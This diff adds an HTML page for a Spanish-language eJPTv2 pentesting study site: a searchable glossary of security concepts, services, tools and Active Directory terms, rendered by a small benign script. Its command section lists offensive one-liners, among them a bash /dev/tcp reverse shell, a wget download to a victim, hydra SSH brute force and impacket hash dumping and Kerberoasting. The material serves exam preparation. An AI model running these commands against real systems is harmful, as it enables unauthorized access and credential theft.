@@ -1,0 +1,197 @@
+<!doctype html>
+<html lang="es" data-root="">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Glosario · Academia eJPTv2</title>
+<meta name="description" content="Glosario con más de 150 términos, herramientas y comandos de pentesting explicados fácil, con buscador.">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="assets/style.css">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+</head>
+<body>
+<div class="layout">
+<aside class="sidebar"></aside>
+<main>
+<h1>📖 Glosario</h1>
+<p class="lead">Más de 150 términos, conceptos, herramientas y comandos explicados en lenguaje sencillo. Usa el buscador.</p>
+<input class="search" id="gsearch" placeholder="🔍 Buscar: nmap, SUID, Kerberos, reverse shell…">
+<div class="filters" id="gfilters"></div>
+<p id="gcount" class="muted" style="font-size:.85rem"></p>
+<div id="gterms"></div>
+</main>
+<nav class="toc"></nav>
+</div>
+<script src="assets/app.js"></script>
+<script>
+const TERMS = [
+["Concepto","Vulnerabilidad","Un fallo o debilidad en un sistema que puede ser aprovechado por un atacante. Ej.: una contraseña por defecto."],
+["Concepto","Exploit","Código o técnica que aprovecha una vulnerabilidad para conseguir algo (p. ej. ejecutar código)."],
+["Concepto","Payload","Lo que se ejecuta tras explotar: una shell, un usuario nuevo, etc."],
+["Concepto","CVE","Identificador único de una vulnerabilidad pública. Ej.: CVE-2017-0144 (EternalBlue)."],
+["Concepto","CVSS","Puntuación de gravedad de una vulnerabilidad, de 0 a 10."],
+["Concepto","0-day","Vulnerabilidad desconocida por el fabricante, sin parche disponible."],
+["Concepto","PoC","Prueba de concepto: demostración de que una vulnerabilidad es explotable."],
+["Concepto","Hash","Huella de un solo sentido de un dato. No se descifra; se adivina probando."],
+["Concepto","Shell","Acceso a la línea de comandos de una máquina."],
+["Concepto","Reverse shell","La víctima se conecta de vuelta a ti (tú escuchas). Evade firewalls de entrada."],
+["Concepto","Bind shell","La víctima abre un puerto y tú te conectas a él."],
+["Concepto","Webshell","Script (PHP/ASP) subido a un servidor web que permite ejecutar comandos vía navegador."],
+["Concepto","Escalada de privilegios","Pasar de un usuario con pocos permisos a root/SYSTEM."],
+["Concepto","Pivoting","Usar una máquina comprometida como puente para atacar otra red interna."],
+["Concepto","Lateral movement","Moverse de una máquina a otra dentro de la misma red con credenciales."],
+["Concepto","Enumeración","Recoger todo el detalle posible de un objetivo (usuarios, versiones, shares)."],
+["Concepto","Footprinting","Reconocimiento inicial para mapear el objetivo."],
+["Concepto","OSINT","Inteligencia de fuentes abiertas: información pública (Google, redes, whois)."],
+["Concepto","Fuzzing","Probar muchas entradas automáticamente para descubrir rutas o fallos."],
+["Concepto","Fuerza bruta","Probar muchas contraseñas/combinaciones hasta acertar."],
+["Concepto","Password spraying","Probar una contraseña común contra muchos usuarios (evita bloqueos)."],
+["Concepto","Pass-the-Hash","Autenticarse usando el hash NTLM sin conocer la contraseña."],
+["Concepto","Golden Ticket","Ticket Kerberos falsificado con el hash de krbtgt: control total del dominio."],
+["Concepto","Persistencia","Mantener el acceso aunque la máquina se reinicie."],
+["Concepto","Firewall","Filtra el tráfico de red según reglas; puede bloquear puertos."],
+["Concepto","NAT","Traduce IPs privadas a una pública para salir a Internet."],
+["Concepto","DMZ","Zona de red semipública donde se ponen servidores accesibles desde fuera."],
+["Concepto","Tríada CIA","Confidencialidad, Integridad, Disponibilidad: los 3 pilares de la seguridad."],
+["Concepto","OWASP Top 10","Lista de los 10 riesgos de seguridad web más comunes."],
+["Concepto","MITRE ATT&CK","Catálogo de técnicas usadas por atacantes reales."],
+["Concepto","IDOR","Acceder a datos de otro usuario cambiando un identificador en la petición."],
+["Concepto","SSRF","Forzar al servidor a hacer peticiones a URLs que tú eliges."],
+["Concepto","CSRF","Engañar al navegador de una víctima para enviar peticiones no deseadas."],
+["Concepto","TTL","Valor en un paquete que ayuda a adivinar el SO (64 Linux, 128 Windows)."],
+["Concepto","Socket","Combinación de IP + puerto (ej. 10.0.0.5:80)."],
+["Concepto","Banner","Texto que muestra un servicio al conectarse; suele revelar su versión."],
+
+["Red","Dirección IP","Identifica un equipo en una red. IPv4: 4 números de 0-255."],
+["Red","Máscara de red","Define qué parte de la IP es red y cuál host (ej. /24)."],
+["Red","CIDR","Notación /n que indica los bits de red (ej. /24 = 255.255.255.0)."],
+["Red","Subred","División de una red en bloques más pequeños."],
+["Red","Broadcast","Dirección para enviar a todos los hosts de una red (la última)."],
+["Red","Gateway","Router por el que se sale a otras redes."],
+["Red","Puerto","Número (0-65535) que identifica un servicio dentro de un equipo."],
+["Red","TCP","Protocolo fiable y orientado a conexión (handshake). HTTP, SSH, SMB."],
+["Red","UDP","Protocolo sin conexión, rápido y no fiable. DNS, SNMP, DHCP."],
+["Red","Three-way handshake","SYN, SYN-ACK, ACK: cómo TCP establece una conexión."],
+["Red","OSI","Modelo de 7 capas que describe la comunicación en red."],
+["Red","MAC","Dirección física de una tarjeta de red (capa 2)."],
+["Red","ARP","Traduce IP a MAC en la red local."],
+["Red","DNS","Traduce nombres (google.com) a IPs."],
+["Red","DHCP","Asigna IPs automáticamente a los equipos."],
+["Red","ICMP","Protocolo de control; el ping lo usa."],
+["Red","Transferencia de zona (AXFR)","Un DNS mal configurado entrega todos sus registros/subdominios."],
+["Red","VPN","Túnel cifrado para conectarse a una red remota de forma segura."],
+
+["Servicio","FTP (21)","Transferencia de ficheros. Buscar login anónimo y subida de ficheros."],
+["Servicio","SSH (22)","Terminal remota cifrada. Fuerza bruta o clave privada robada."],
+["Servicio","Telnet (23)","Terminal remota SIN cifrar; todo viaja en claro."],
+["Servicio","SMTP (25)","Envío de correo. Enumerar usuarios con VRFY."],
+["Servicio","HTTP (80)","Web sin cifrar. Mayor superficie de ataque."],
+["Servicio","HTTPS (443)","Web cifrada con TLS."],
+["Servicio","POP3/IMAP (110/143)","Lectura de correo."],
+["Servicio","SMB (445/139)","Compartir ficheros Windows. Shares, null session, EternalBlue."],
+["Servicio","SNMP (161 UDP)","Gestión de red. Comunidad 'public' filtra información."],
+["Servicio","LDAP (389)","Directorio, base de Active Directory. Enumerar usuarios."],
+["Servicio","Kerberos (88)","Autenticación por tickets en AD."],
+["Servicio","MySQL (3306)","Base de datos. Probar root sin contraseña."],
+["Servicio","MSSQL (1433)","Base de datos de Microsoft. xp_cmdshell permite ejecutar comandos."],
+["Servicio","RDP (3389)","Escritorio remoto de Windows."],
+["Servicio","WinRM (5985)","PowerShell remoto. Acceso con evil-winrm."],
+["Servicio","NFS (2049)","Compartición de ficheros en Linux/Unix."],
+
+["Herramienta","Nmap","Escáner de puertos y servicios. La herramienta nº1 del pentester."],
+["Herramienta","Netcat (nc)","\"Navaja suiza\" de red: escuchar puertos, transferir, shells."],
+["Herramienta","Wireshark","Analizador de tráfico de red (ver paquetes)."],
+["Herramienta","Burp Suite","Proxy web para interceptar y modificar peticiones HTTP."],
+["Herramienta","Metasploit","Framework de explotación con miles de exploits y payloads."],
+["Herramienta","msfvenom","Generador de payloads (shells) de Metasploit."],
+["Herramienta","Meterpreter","Payload avanzado de Metasploit con muchas funciones."],
+["Herramienta","searchsploit","Busca exploits en la base local de Exploit-DB."],
+["Herramienta","Gobuster","Descubre rutas/ficheros/subdominios ocultos por fuerza bruta."],
+["Herramienta","ffuf","Fuzzer web muy rápido (rutas, parámetros, vhosts)."],
+["Herramienta","Nikto","Escáner rápido de vulnerabilidades web conocidas."],
+["Herramienta","wpscan","Escáner específico de WordPress."],
+["Herramienta","sqlmap","Automatiza la detección y explotación de inyección SQL."],
+["Herramienta","Hydra","Fuerza bruta online contra servicios (SSH, FTP, RDP, web)."],
+["Herramienta","John the Ripper","Crackeador de hashes offline (CPU)."],
+["Herramienta","Hashcat","Crackeador de hashes offline (GPU, muy rápido)."],
+["Herramienta","hashid","Identifica el tipo de un hash."],
+["Herramienta","enum4linux","Enumeración completa de SMB/Windows (usuarios, shares)."],
+["Herramienta","smbclient","Cliente para conectarse a shares SMB."],
+["Herramienta","CrackMapExec","Navaja suiza para redes Windows/AD (SMB, WinRM, spraying)."],
+["Herramienta","evil-winrm","Shell remota de PowerShell por WinRM."],
+["Herramienta","impacket","Colección de scripts Python para protocolos Windows (psexec, secretsdump)."],
+["Herramienta","BloodHound","Mapea Active Directory y muestra caminos a Domain Admin."],
+["Herramienta","Mimikatz","Extrae credenciales y hashes de la memoria de Windows."],
+["Herramienta","linpeas","Script que enumera vectores de escalada en Linux."],
+["Herramienta","winPEAS","Igual que linpeas pero para Windows."],
+["Herramienta","pspy","Observa procesos y cron en tiempo real sin ser root."],
+["Herramienta","GTFOBins","Web que indica cómo abusar de binarios Linux (sudo/SUID)."],
+["Herramienta","LOLBAS","Equivalente de GTFOBins para binarios de Windows."],
+["Herramienta","chisel","Herramienta de tunelización para pivoting."],
+["Herramienta","ligolo-ng","Herramienta moderna de pivoting con interfaz tun."],
+["Herramienta","proxychains","Fuerza a cualquier herramienta a pasar por un proxy/túnel."],
+["Herramienta","theHarvester","Recolecta correos y subdominios de fuentes públicas."],
+["Herramienta","whatweb","Identifica tecnologías de un sitio web."],
+["Herramienta","responder","Captura hashes NetNTLM envenenando protocolos de red."],
+["Herramienta","xfreerdp","Cliente de RDP desde Linux."],
+["Herramienta","dirb/dirbuster","Descubrimiento de contenido web (como gobuster)."],
+
+["Comando","nmap -p- IP","Escanea los 65535 puertos TCP."],
+["Comando","nmap -sC -sV IP","Scripts por defecto + versiones de servicios."],
+["Comando","nmap -sU IP","Escaneo UDP."],
+["Comando","nmap -Pn IP","No hace ping; útil si el host no responde al ping."],
+["Comando","nc -lvnp 443","Netcat a la escucha en el puerto 443 (recibir reverse shell)."],
+["Comando","bash -i >& /dev/tcp/IP/443 0>&1","Reverse shell en bash."],
+["Comando","python3 -m http.server 80","Servir la carpeta actual por HTTP (transferir ficheros)."],
+["Comando","wget http://IP/f -O /tmp/f","Descargar un fichero en la víctima."],
+["Comando","sudo -l","Muestra qué puedes ejecutar como root. Primer paso de privesc."],
+["Comando","find / -perm -4000 2>/dev/null","Busca binarios con bit SUID."],
+["Comando","getcap -r / 2>/dev/null","Lista capabilities de ficheros."],
+["Comando","id / whoami","Muestra tu usuario y grupos."],
+["Comando","whoami /priv","Privilegios del usuario en Windows."],
+["Comando","unshadow passwd shadow","Combina passwd y shadow para crackear con John."],
+["Comando","hashcat -m 1000 h.txt rockyou.txt","Crackea hashes NTLM con diccionario."],
+["Comando","hydra -l user -P rockyou.txt ssh://IP","Fuerza bruta SSH."],
+["Comando","smbclient -L //IP/ -N","Lista shares SMB sin credenciales."],
+["Comando","enum4linux -a IP","Enumeración SMB completa."],
+["Comando","dig AXFR dominio @servidor","Intenta transferencia de zona DNS."],
+["Comando","gobuster dir -u URL -w lista","Busca rutas ocultas en una web."],
+["Comando","searchsploit servicio version","Busca exploits para esa versión."],
+["Comando","impacket-GetUserSPNs dom/u:p -request","Kerberoasting."],
+["Comando","impacket-secretsdump dom/u:p@IP","Vuelca hashes del objetivo/dominio."],
+["Comando","stty raw -echo; fg","Parte de la estabilización de una shell TTY."],
+["Comando","proxychains nmap -sT IP","Escanea a través de un túnel SOCKS."],
+
+["AD","Dominio","Conjunto de equipos y usuarios gestionados centralmente."],
+["AD","Controlador de Dominio (DC)","Servidor que guarda todas las cuentas del dominio (NTDS.dit)."],
+["AD","Domain Admin","Cuenta con control total del dominio. Objetivo final."],
+["AD","Kerberos","Sistema de autenticación por tickets (TGT y TGS)."],
+["AD","TGT","Ticket inicial que te da el DC para pedir otros tickets."],
+["AD","TGS","Ticket para acceder a un servicio concreto."],
+["AD","NTLM","Hash/protocolo de autenticación heredado de Windows."],
+["AD","Kerberoasting","Pedir tickets de cuentas de servicio para crackearlos offline."],
+["AD","AS-REP Roasting","Obtener un hash crackeable de usuarios sin pre-autenticación."],
+["AD","DCSync","Pedir al DC los hashes como si fueras otro DC."],
+["AD","SPN","Nombre que identifica un servicio asociado a una cuenta en AD."],
+["AD","SAM","Base de datos de cuentas LOCALES de un Windows."],
+["AD","LSASS","Proceso de Windows que guarda credenciales en memoria."],
+["AD","NTDS.dit","Base de datos con todas las credenciales del dominio."]
+];
+
+const cont = document.getElementById("gterms");
+const cats = [...new Set(TERMS.map(t=>t[0]))];
+let active = "Todos";
+const fdiv = document.getElementById("gfilters");
+fdiv.innerHTML = ["Todos",...cats].map(c=>`<button class="${c==='Todos'?'on':''}" data-c="${c}">${c}</button>`).join("");
+fdiv.querySelectorAll("button").forEach(b=>b.onclick=()=>{active=b.dataset.c;fdiv.querySelectorAll("button").forEach(x=>x.classList.toggle("on",x===b));render();});
+const inp = document.getElementById("gsearch");
+inp.oninput = render;
+function render(){
+  const q = inp.value.toLowerCase().trim();
+  const list = TERMS.filter(t=>(active==="Todos"||t[0]===active) && (!q || (t[1]+t[2]).toLowerCase().includes(q)));
+  cont.innerHTML = list.map(t=>`<div class="term"><h4>${t[1]} <span class="badge">${t[0]}</span></h4><p>${t[2]}</p></div>`).join("") || "<p>Sin resultados.</p>";
+  document.getElementById("gcount").textContent = `${list.length} términos`;
+}
+render();
+</script>
+</body>
+</html>
